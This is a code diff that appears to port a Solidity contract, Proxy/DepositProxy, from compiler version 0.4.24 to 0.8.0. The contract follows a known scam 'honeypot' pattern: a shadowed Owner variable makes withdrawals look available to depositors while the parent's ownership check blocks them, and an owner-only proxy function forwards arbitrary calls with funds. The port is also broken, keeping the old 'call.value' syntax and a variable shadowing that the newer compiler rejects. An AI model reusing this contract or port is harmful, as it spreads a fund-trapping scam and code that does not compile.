@@ -4,12 +4,12 @@
  * =======================
  */
 
-pragma solidity ^0.4.24;
+pragma solidity ^0.8.0;
 
 contract Proxy  {
     modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
     function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
-    function proxy(address target, bytes data) public payable {
+    function proxy(address target, bytes memory data) public payable {
         
         target.call.value(msg.value)(data);
     }
@@ -19,7 +19,7 @@ contract DepositProxy is Proxy {
     address public Owner;
     mapping (address => uint256) public Deposits;
 
-    function () public payable { }
+    receive() external payable { }
     
     function Vault() public payable {
         if (msg.sender == tx.origin) {
@@ -36,7 +36,7 @@ contract DepositProxy is Proxy {
     
     function withdraw(uint256 amount) public onlyOwner {
         if (amount>0 && Deposits[msg.sender]>=amount) {
-            msg.sender.transfer(amount);
+            payable(msg.sender).transfer(amount);
         }
     }
 }
